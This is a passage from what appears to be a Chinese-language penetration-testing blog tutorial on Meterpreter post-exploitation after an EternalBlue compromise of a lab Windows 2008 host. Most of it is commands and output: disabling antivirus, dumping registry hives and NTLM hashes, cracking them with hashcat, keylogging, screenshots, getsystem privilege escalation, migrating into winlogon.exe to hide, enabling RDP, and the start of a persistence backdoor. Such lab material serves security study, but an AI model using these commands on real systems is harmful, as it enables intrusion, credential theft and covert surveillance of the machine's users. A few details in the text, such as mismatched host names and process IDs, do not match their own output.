(192.168.100.246)</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，有一个活跃的Meterpreter会话。此时，使用sessions-i[id]命令，即可激活该会话。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>从输出信息中可以看到，成功启动了第一个交互会话。</p></li></ol><h2 id="五、控制Meterpreter会话"><a href="#五、控制Meterpreter会话" class="headerlink" title="五、控制Meterpreter会话"></a>五、控制Meterpreter会话</h2><p>当渗透测试者利用某漏洞成功渗透到目标系统，并且获取到Meterpreter会话后，可以利用其漏洞模块支持的Meterpreter命令来控制Meterpreter会话，以获取目标主机的更多信息或控制目标主机，如关闭杀毒软件、键盘捕获、屏幕截图、提升权限及创建账户等。下面以刚刚获取到的Meterpreter会话为例。</p><h3 id="5-1-关闭杀毒软件"><a href="#5-1-关闭杀毒软件" class="headerlink" title="5.1 关闭杀毒软件"></a>5.1 关闭杀毒软件</h3><p>一般情况下，用户都会在计算机中安装杀毒软件。为了方便实施其他操作，用户可以关闭杀毒软件。当渗透测试者拿到目标主机的Shell后，可以使用run killav命令关闭目标主机的杀毒软件。命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run killav</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.</span><br><span class="line">[!] Example: run post/windows/manage/killav OPTION=value [...]</span><br><span class="line">[*] Killing Antivirus services on the target...</span><br><span class="line">[*] Killing off cmd.exe...</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，杀死了目标主机的反病毒服务，并且结束了cmd.exe程序。</p><h3 id="5-2-获取目标主机的详细信息"><a href="#5-2-获取目标主机的详细信息" class="headerlink" title="5.2 获取目标主机的详细信息"></a>5.2 获取目标主机的详细信息</h3><p>为了更了解目标主机的信息，可以使用sysinfo命令查看目标主机的系统信息。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : WIN-FJQ974EQ9HI                 <span class="comment">#计算机名称</span></span><br><span class="line">OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).   <span class="comment">#操作系统类型</span></span><br><span class="line">Architecture    : x64                             <span class="comment">#架构</span></span><br><span class="line">System Language : zh_CN                           <span class="comment">#系统语言</span></span><br><span class="line">Domain          : WORKGROUP                       <span class="comment">#域名</span></span><br><span class="line">Logged On Users : 1                               <span class="comment">#登录的用户</span></span><br><span class="line">Meterpreter     : x64/windows                     <span class="comment">#Meterpreter会话</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到目标主机的详细信息。例如，计算机名称为WIN-TJUIK7N16BP；操作系统类型为Windows 2008 R2(Build 7600)；架构为x64等。</p><p>用户还可以使用run scraper命令查看目标主机的详细信息，然后下载并保存在本地。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run scraper</span><br><span class="line">[*] New session on 192.168.100.246:445...</span><br><span class="line">[*] Gathering basic system information...           <span class="comment">#收集基本系统信息</span></span><br><span class="line">[*] Dumping password hashes...                      <span class="comment">#捕获密码哈希</span></span><br><span class="line">[*] Obtaining the entire registry...                <span class="comment">#获取到的注册表条目</span></span><br><span class="line">[*]  Exporting HKCU</span><br><span class="line">[*]  Downloading HKCU (C:\Windows\TEMP\cMWirfMp.reg)</span><br><span class="line">[*]  Cleaning HKCU</span><br><span class="line">[*]  Exporting HKLM</span><br><span class="line">[*]  Downloading HKLM (C:\Windows\TEMP\WMlVMAef.reg)</span><br><span class="line">[*]  Cleaning HKLM</span><br><span class="line">[*]  Exporting HKCC</span><br><span class="line">[*]  Downloading HKCC (C:\Windows\TEMP\SqeJlpTW.reg)</span><br><span class="line">[*]  Cleaning HKCC</span><br><span class="line">[*]  Exporting HKCR</span><br><span class="line">[*]  Downloading HKCR (C:\Windows\TEMP\OZrUsRSJ.reg)</span><br><span class="line">[*]  Cleaning HKCR</span><br><span class="line">[*]  Exporting HKU</span><br><span class="line">[*]  Downloading HKU (C:\Windows\TEMP\JVGScOfZ.reg)</span><br><span class="line">[*]  Cleaning HKU</span><br><span class="line">[*]  Completed processing on 192.168.100.246:445...</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，已获取到目标主机的详细信息。而且，将获取到的信息下载并保存到了本地的C:\Windows\TEMP目录中。这些信息以Windows注册表文件形式保存。</p><h3 id="5-3-检查目标是否运行在虚拟机"><a href="#5-3-检查目标是否运行在虚拟机" class="headerlink" title="5.3 检查目标是否运行在虚拟机"></a>5.3 检查目标是否运行在虚拟机</h3><p>用户还可以查看靶机是否运行在虚拟机。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm </span><br><span class="line"></span><br><span class="line">[*] Checking <span class="keyword">if</span> WIN-FJQ974EQ9HI is a Virtual Machine ...</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，检测到目标主机是一个VMware虚拟机。由此可以说明，目标靶机运行在VMware虚拟机。</p><h3 id="5-4-访问文件系统"><a href="#5-4-访问文件系统" class="headerlink" title="5.4 访问文件系统"></a>5.4 访问文件系统</h3><p>Meterpreter支持各种文件系统命令，这些命令基本和Linux系统命令相似。下面使用这些基础的命令访问目标主机的文件系统，如查看当前工作目录、当前目录中的文件及创建目录等。</p><p>访问目标主机的文件系统。</p><ol><li><p>使用pwd命令查看当前工作目录。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">C:\Users\Public\Desktop</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，目标主机Shell的当前工作目录为C:\Users\Public\Desktop。</p></li><li><p>使用ls查看当前目录中的文件。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\Public\Desktop</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  174   fil   2009-07-14 12:57:54 +0800  desktop.ini</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，当前目录中有一个名为desktop.ini的文件。</p></li><li><p>使用rm命令删除desktop.ini文件。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; rm desktop.ini</span><br></pre></td></tr></table></figure><p>执行以上命令后，将不会输出任何信息。此时，可以再次查看文件列表，以确定该文件是否成功被删除。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls </span><br><span class="line">No entries exist <span class="keyword">in</span> C:\Users\Public\Desktop</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，当前目录中没有任何文件。由此可以说明，desktop.ini文件成功被删除。</p></li><li><p>切换工作目录。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure><p>执行以上命令后，将切换到上一级目录，即C:\Users\Public。此时，再次查看当前目录的文件列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\Public</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">40555/r-xr-xr-x   0     dir   2009-07-14 11:20:08 +0800  Desktop</span><br><span class="line">40555/r-xr-xr-x   4096  dir   2009-07-14 11:20:08 +0800  Documents</span><br><span class="line">40555/r-xr-xr-x   0     dir   2009-07-14 11:20:08 +0800  Downloads</span><br><span class="line">40555/r-xr-xr-x   0     dir   2009-07-14 11:20:08 +0800  Favorites</span><br><span class="line">40555/r-xr-xr-x   0     dir   2009-07-14 11:20:08 +0800  Libraries</span><br><span class="line">40555/r-xr-xr-x   0     dir   2009-07-14 11:20:08 +0800  Music</span><br><span class="line">40555/r-xr-xr-x   0     dir   2009-07-14 11:20:08 +0800  Pictures</span><br><span class="line">40555/r-xr-xr-x   0     dir   2009-07-14 11:20:08 +0800  Videos</span><br><span class="line">100666/rw-rw-rw-  174   fil   2009-07-14 12:57:55 +0800  desktop.ini</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到当前目录中的所有文件。</p></li><li><p>创建一个名为test的目录。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; mkdir <span class="built_in">test</span></span><br><span class="line">Creating directory: <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功创建了一个名为test的目录。</p></li></ol><h3 id="5-5-上传-下载文件"><a href="#5-5-上传-下载文件" class="headerlink" title="5.5 上传/下载文件"></a>5.5 上传/下载文件</h3><p>在Meterpreter会话中，用户还可以实现文件的上传和下载。其中，下载文件的语法格式如下：</p><blockquote><p>download file</p></blockquote><p>上传文件的语法格式如下：</p><blockquote><p>upload file</p></blockquote><p><strong>从目标主机下载Pictures文件。执行命令如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; download Pictures</span><br><span class="line">[*] downloading: Pictures\desktop.ini -&gt; /root/Pictures/desktop.ini</span><br><span class="line">[*] download   : Pictures\desktop.ini -&gt; /root/Pictures/desktop.ini</span><br><span class="line">[*] mirroring  : Pictures\Sample Pictures -&gt; /root/Pictures/Sample Pictures</span><br><span class="line">[*] downloading: Pictures\Sample Pictures\desktop.ini -&gt; /root/Pictures/Sample Pictures/desktop.ini</span><br><span class="line">[*] download   : Pictures\Sample Pictures\desktop.ini -&gt; /root/Pictures/Sample Pictures/desktop.ini</span><br><span class="line">[*] mirrored   : Pictures\Sample Pictures -&gt; /root/Pictures/Sample Pictures</span><br></pre></td></tr></table></figure><p>看到以上输出信息，表示成功下载了Pictures文件。</p><p><strong>将本地的passwords.txt文件上传到目标主机。执行命令如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/passwords.txt</span><br><span class="line">[*] uploading  : /root/passwords.txt -&gt; passwords.txt</span><br><span class="line">[*] Uploaded 5.00 B of 5.00 B (100.0%): /root/passwords.txt -&gt; passwords.txt</span><br><span class="line">[*] uploaded   : /root/passwords.txt -&gt; passwords.txt</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示成功上传了passwords.txt文件。此时，可以通过查看当前文件列表，以确认上传文件成功。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls passwords.txt</span><br><span class="line">100666/rw-rw-rw-  5  fil  2020-12-22 17:52:07 +0800  passwords.txt</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到用户上传的passwords.txt文件。</p><h3 id="5-6-键盘捕获"><a href="#5-6-键盘捕获" class="headerlink" title="5.6 键盘捕获"></a>5.6 键盘捕获</h3><p>渗透测试者可以通过启动键盘捕获功能来获取目标用户输入的信息，如用户名和密码等。其中，启动键盘捕获的命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start </span><br><span class="line">Starting the keystroke sniffer ...</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功启动了键盘捕获。为了模拟这个测试过程，用户可以手动在目标主机输入一些信息，供渗透测试者捕获。当用户在目标主机中输入一些信息后，在攻击主机上使用keyscan_dump命令，即可捕获输入的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">  &lt;Return&gt;  &lt;Return&gt;  &lt;Return&gt;  &lt;N1&gt;  &lt;Return&gt; 2 &lt;Return&gt; 34</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功捕获了目标用户输入的信息。如果用户不想继续捕获目标主机数据时，可以停止键盘捕获。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示成功停止了键盘捕获。</p><h3 id="5-7-屏幕截图"><a href="#5-7-屏幕截图" class="headerlink" title="5.7 屏幕截图"></a>5.7 屏幕截图</h3><p>用户通过实施屏幕截图，可以看到目标用户正在执行的操作，如打开的文件和网页等。下面将对目标屏幕进行截图。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot </span><br><span class="line">Screenshot saved to: /root/gXadXrPM.jpeg</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功截取了目标主机的屏幕，并且保存到/root/gXadXrPM.jpeg文件中。此时，用户可以查看该截图，以确认目标用户执行的操作，如下图所示。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%8712.png" alt="图片12"></p><h3 id="5-8-枚举用户"><a href="#5-8-枚举用户" class="headerlink" title="5.8 枚举用户"></a>5.8 枚举用户</h3><p>渗透测试者还可以使用<code>run post/windows/gather/enum_logged_on_user</code>命令枚举目标主机中的用户。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_logged_on_users </span><br><span class="line"></span><br><span class="line">[*] Running against session 1</span><br><span class="line"></span><br><span class="line">Current Logged Users</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line"> SID                                            User</span><br><span class="line"> ---                                            ----</span><br><span class="line"> S-1-5-18                                       NT AUTHORITY\SYSTEM</span><br><span class="line"> S-1-5-21-2138728887-1485734618-2934346151-500  WIN-FJQ974EQ9HI\Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Results saved <span class="keyword">in</span>: /root/.msf4/loot/20201222180746_default_192.168.100.246_host.users.activ_092975.txt</span><br><span class="line"></span><br><span class="line">Recently Logged Users</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line"> SID                                            Profile Path</span><br><span class="line"> ---                                            ------------</span><br><span class="line"> S-1-5-18                                       %systemroot%\system32\config\systemprofile</span><br><span class="line"> S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService</span><br><span class="line"> S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService</span><br><span class="line"> S-1-5-21-2138728887-1485734618-2934346151-500  C:\Users\Administrator</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，目标主机中只有一个用户，用户名为Administrator。</p><h3 id="5-9-权限提升"><a href="#5-9-权限提升" class="headerlink" title="5.9 权限提升"></a>5.9 权限提升</h3><p>在某些情况下，用户获取的Meterpreter会话会受到用户权限的限制，这将会影响渗透测试者在目标系统中的操作，如修改注册表、安装后门或者导出密码等。此时，用户可以使用getsystem命令，对当前用户进行提权。下面将介绍如何对用户进行权限提升。</p><p>对普通用户进行提权。首先查看当前用户的权限信息。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: <span class="built_in">test</span>-PC\<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，当前用户是一个普通用户，其用户名为test。接下来，将使用getsystem命令对该用户进行提权。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br></pre></td></tr></table></figure><p>看到以上输出信息，表示成功对当前用户进行了提权。此时，再次查看用户权限。结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，当前用户的权限为NT AUTHORITY\SYSTEM。由此可以说明，成功提升了用户的权限。</p><h3 id="5-10-获取用户密码"><a href="#5-10-获取用户密码" class="headerlink" title="5.10 获取用户密码"></a>5.10 获取用户密码</h3><p>当用户获取的Meterpreter会话拥有一定权限时，则可以获取用户密码。下面将使用hashdump命令获取用户的密码。</p><p>获取用户密码。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b3255351d8dfe7cdedf3f552a49146d6:::</span><br><span class="line"><span class="built_in">test</span>:1001:aad3b435b51404eeaad3b435b51404ee:aeb1c90bbed3a069d98bf65a109</span><br><span class="line">e77c2:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，目标主机中有3个用户，分别是Administrator、test和Guest。以上输出信息的格式为，用户名:SID:LM哈希:NTLM哈希。其中，LM哈希aad3b435b51404eeaad3b435b51404ee和NTLM哈希31d6cfe0d16ae931b73c59d7e0c089c0对应的是一个空密码。</p><ul><li><strong>离线破解：</strong></li></ul><p>使用hashdump命令获取的哈希密码，还需要进一步破解才可以得到真正的密码，这里使用Hashcat进行密码破解。</p><p>hashcat号称世界上最快的密码破解，世界上第一个和唯一的基于GPGPU规则引擎，免费多GPU（高达128个GPU），多哈希，多操作系统（Linux和Windows本地二进制文件），多平台（OpenCL和CUDA支持），多算法，资源利用率低，基于字典攻击，支持分布式破解等等，目前最新版本为4.01，下载地址 <a href="https://hashcat.net/files/hashcat-4.1.0.7z" target="_blank" rel="noopener">https://hashcat.net/files/hashcat-4.1.0.7z</a> ，hashcat目前支持各类公开算法高达247类，市面上面公开的密码加密算法基本都支持！</p><p>5位小写+ 大写+数字+特殊字符破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hashcat -m 1000 b3255351d8dfe7cdedf3f552a49146d6 -a 3 ?b?b?b?b?b -w 3</span></span><br></pre></td></tr></table></figure><p>破解需要一段时间，</p><ul><li><strong>在线破解：</strong></li></ul><p>利用在线破解网站轻松跑出HASH，简单便捷，常用在线破解网站：</p><p><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a> ：“一直被抄袭，从未被超越”，可以轻松破解MD5、SHA1、MySQL、NTLM等HASH值，如果这个网站跑不出来，说明密码已相当复杂；<br><a href="https://hashes.com/en/decrypt/hash" target="_blank" rel="noopener">https://hashes.com/en/decrypt/hash</a> ：免费破解MD5、SHA1、MySQL、NTLM、SHA256、SHA512等HASH值。</p><h3 id="5-11-绑定进程"><a href="#5-11-绑定进程" class="headerlink" title="5.11 绑定进程"></a>5.11 绑定进程</h3><p>Meterpreter既可以单独运行，也可以与其他进程进行绑定。当Meterpreter单独作为一个进程运行时，很容易被发现。如果将它与系统中经常运行的进程进行绑定，就能够实现持久化。</p><p>绑定进程，并捕获键盘记录。</p><ol><li><p>查看当前系统中运行的进程。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                  Arch  Session  User                           Path</span><br><span class="line"> ---   ----  ----                  ----  -------  ----                           ----</span><br><span class="line"> 0     0     [System Process]                                                    </span><br><span class="line"> 4     0     System                x64   0                                       </span><br><span class="line"> 240   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM            \SystemRoot\System32\smss.exe</span><br><span class="line"> 328   508   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\system32\svchost.exe</span><br><span class="line"> 336   324   csrss.exe             x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\csrss.exe</span><br><span class="line"> 404   396   csrss.exe             x64   1        NT AUTHORITY\SYSTEM            C:\Windows\system32\csrss.exe</span><br><span class="line"> 412   324   wininit.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\wininit.exe</span><br><span class="line"> 448   396   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM            C:\Windows\system32\winlogon.exe</span><br><span class="line"> 508   412   services.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\services.exe </span><br><span class="line"> …//省略部分内容//…</span><br><span class="line"> 2864  2220  cmd.exe               x64   1        WIN-FJQ974EQ9HI\Administrator  C:\Windows\system32\cmd.exe</span><br><span class="line"> 3016  508   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\system32\svchost.exe</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，显示了当前系统中运行的所有进程。输出的信息共包括7列，分别表示PID（进程ID）、PPID（父ID）、Name（进程名）、Arch（架构）、Session（会话）、User（用户名）和Path（路径）。例如，这里将选择Meterpreter与winlogon.exe进程绑定。其中，该进程ID为448。</p></li><li><p>使用getpid命令查看当前的进程ID。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 1048</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，当前进程ID为1048。</p></li><li><p>使用migrate命令绑定进程。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 448</span><br><span class="line">[*] Migrating from 1048 to 448...</span><br><span class="line">[*] Migration completed successfully.</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，进程成功被迁移到400。</p></li></ol><h3 id="5-12-运行程序"><a href="#5-12-运行程序" class="headerlink" title="5.12 运行程序"></a>5.12 运行程序</h3><p>在Meterpreter中，渗透测试者还可以使用execute命令在目标系统中执行应用程序。该命令的语法格式如下：</p><blockquote><p>execute [options] -f command</p></blockquote><p>该命令可用的选项及含义如下：</p><blockquote><p>-H：创建一个隐藏进程。<br>-a：传递给命令的参数。<br>-i：跟进程进行交互。<br>-m：从内存中执行。<br>-t：使用当前伪造的线程令牌运行进程。<br>-s：在给定的会话中执行进程。</p></blockquote><p>在目标主机上运行一个CMD程序。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -s 1 -f cmd</span><br><span class="line">Process 592 created.</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，创建了ID为592的进程。此时，在目标主机上即可看到启动的CMD程序，如下图所示。</p><h3 id="5-13-启动远程桌面"><a href="#5-13-启动远程桌面" class="headerlink" title="5.13 启动远程桌面"></a>5.13 启动远程桌面</h3><p>在Meterpreter中，用户还可以启动远程桌面，以实现远程连接目标主机。下面将介绍启用远程桌面并远程登录的方法。</p><p>启用远程桌面。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp </span><br><span class="line"></span><br><span class="line">[*] Enabling Remote Desktop</span><br><span class="line">[*]     RDP is disabled; enabling it ...</span><br><span class="line">[*] Setting Terminal Services service startup mode</span><br><span class="line">[*]     The Terminal Services service is not <span class="built_in">set</span> to auto, changing it to auto ...</span><br><span class="line">[*]     Opening port <span class="keyword">in</span> <span class="built_in">local</span> firewall <span class="keyword">if</span> necessary</span><br><span class="line">[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20201223144916_default_192.168.100.246_host.windows.cle_007584.txt</span><br></pre></td></tr></table></figure><p>看到以上输出信息，表示成功启动了远程桌面。接下来，用户还需要检查远程用户的空闲时长。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle <span class="keyword">for</span>: 1 hours 05 mins 36 secs</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，用户的空闲时长为1小时05分36秒。接下来，渗透测试者就可以远程访问目标主机的桌面了。<br>用户通过一些方法可以获取目标主机的用户名和密码，如hashdump命令和mimikatz模块等。此时，用户可以利用获取的用户信息，在Kali主机中远程连接目标主机。下面将使用rdesktop命令远程连接桌面。</p><p>执行命令如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># rdesktop <span class="number">192.168</span><span class="number">.100</span><span class="number">.246</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将打开一个远程桌面，如下图所示。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%8713.png" alt="图片13"></p><h3 id="5-14-持久后门"><a href="#5-14-持久后门" class="headerlink" title="5.14 持久后门"></a>5.14 持久后门</h3><p>当成功获取目标系统的访问权限后，渗透测试者肯定不希望再次采用同样费力的方式重新获得访问权限。由于Meterpreter是基于内存DLL建立的连接，所以，只要目标主机关机，Meterpreter连接就会断开。因此，为了方便后续渗透测试，可以创建持久后门。这样，只要目标主机开机，将自动与攻击主机建立连接。而且，当创建持久后门后，即使连接被中断，也不会影响工作。这里介绍使用run persistence命令创建持久后门。</p><p>语法格式如下：</p><blockquote><p>run persistence -X 